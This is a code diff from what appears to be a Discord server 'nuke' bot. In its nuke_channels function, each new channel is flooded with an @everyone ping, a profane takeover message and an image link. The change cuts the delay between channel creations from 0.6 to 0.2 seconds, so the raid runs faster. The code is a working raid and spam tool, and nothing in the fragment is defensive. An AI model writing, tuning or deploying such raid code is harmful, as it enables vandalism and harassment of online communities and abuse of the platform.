@@ -28,7 +28,7 @@ async def nuke_channels(guild):
             await new_channel.send("@everyone")
             await new_channel.send("# THIS SERVER HAS BEEN SEIZED BY CITY-31'S OVERWATCH TACTICAL CONTROL FOR SELFISHNESS AND PURE DISRESPECT. GET FUCKED.")
             await new_channel.send("https://i.ibb.co/8BqScCN/Overwatch-Tactical-Control0.png")
-            await asyncio.sleep(0.6)  # Adding a delay between channel creations
+            await asyncio.sleep(0.2)  # Adding a delay between channel creations
     except discord.Forbidden:
         print("Missing permissions to perform channel operations.")
     except Exception as e:
